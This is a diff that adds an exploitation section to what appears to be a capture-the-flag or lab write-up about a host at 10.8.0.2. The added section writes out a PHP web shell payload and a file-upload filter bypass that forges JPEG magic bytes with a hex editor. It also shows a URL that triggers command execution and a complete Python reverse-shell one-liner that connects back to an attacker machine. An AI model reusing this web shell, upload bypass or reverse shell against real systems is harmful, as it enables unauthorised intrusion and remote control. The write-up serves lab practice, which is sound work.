@@ -442,8 +442,45 @@ To get RCE on this target we'll bypass the file upload functionality so we can u
 
 ## Exploitation (10.8.0.2)
 
+Lets cook our malicious script
 
+payload:```AAAA<?php system($_GET['cmd']); ?>```
+
+Store this payload in a file (abeg.php), then use the “hexeditor” tool to modify the ```abeg.php``` header to a ```.jpeg``` header.
   
+`19`
+
+Now, lets use hexeditor to modify the header of this file
+
+command:```hexeditor abeg.php```
+
+`20`
+
+From the above screenshot, you will see that the AAAA has the header ```41 41 41 41```, we'll modify the header to that of a .jpeg file. Checking it up online I found it to be ```FF D8 FF EE```
+
+`21`
+
+Now that we have modified the header, save it and exit (hit ctrl +x, then hit the enter button to exit).
+
+Using the cat command to read the file you will observe it is different from what we initially put there
+
+`21.5`
+
+Now, that we've successfully modified the header. We can go ahead to upload our file
+
+`22`
+`23`
+
+To get our RCE, just use this ```http://10.8.0.2/uploads/abeg.php?cmd=id```
+
+`24`
+
+I got my reverse shell using this python payload ```python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.0.4",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/sh")'```
+
+`25`
+
+We are in, 
+
 
 
 
